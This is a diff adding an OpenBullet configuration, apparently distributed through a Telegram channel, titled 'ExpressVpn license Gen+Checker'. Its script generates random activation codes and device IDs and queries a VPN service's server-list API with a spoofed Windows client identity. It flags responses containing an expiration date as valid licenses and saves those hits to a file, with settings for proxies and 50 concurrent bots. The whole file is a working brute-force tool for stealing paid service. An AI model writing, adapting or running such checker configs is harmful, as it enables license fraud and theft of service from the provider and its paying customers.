@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "ExpressVpn license Gen+Checker",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-27T13:32:03.7275476+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 1379969594
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#rnd FUNCTION RandomString "?d?d?d?d?d?d?d?d?d?d?d?d?d?h?d?h?d?h?d?d?h?d?d?d?h?h?d?d?d?d?d?h?h?d?d?d?h?d?d?h?d?h?d?h?h?d?h?d?h?h?d?d?h?d?d?d?h?d?d?d?d?d?d?d" -> VAR "rnd" 
+
+#rnd2 FUNCTION RandomString "E?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m" -> VAR "rnd2" 
+
+#Check_license REQUEST GET "https://www.ftrftcx.net/vpn_servers?activation_code=<rnd2>&ca_version=2&client_version=6.6.0&conn_requests=1&device_id=<rnd>&device_name=Windows&dpi=hdpi&include_country_and_region=1&include_pptp_l2tp_ipsec_servers=1&include_recommended_clusters=1&include_sstp_servers=1&os_version=win10.0.0&show_messages=1&smart_location=1&smartdns=1" 
+  
+  HEADER "Host: www.ftrftcx.net" 
+  HEADER "User-Agent: Go-http-client/1.1" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+IF "<SOURCE>" Contains "authentication failed"
+SET STATUS FAIL
+ENDIF
+IF "<SOURCE>" Contains "<expiration_date>"
+SET STATUS SUCCESS
+ENDIF
+IF "<SOURCE>" Contains "Payment Verification Needed"
+SET STATUS CUSTOM "FREE"
+ENDIF
+
+#expireDate PARSE "<SOURCE>" LR "<expiration_date>" "</expiration_date>" -> VAR "expireDate" 
+
+SET CAP "license" "<rnd2> | expireDate: <expireDate>"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletChannel"
+
+#Save UTILITY File "ExpressVpn Gen+Checker Hits.txt" AppendLines "license: <license>    |     Telegram Channel: https://t.me/OpenBulletChannel" -> VAR "Save" 
+
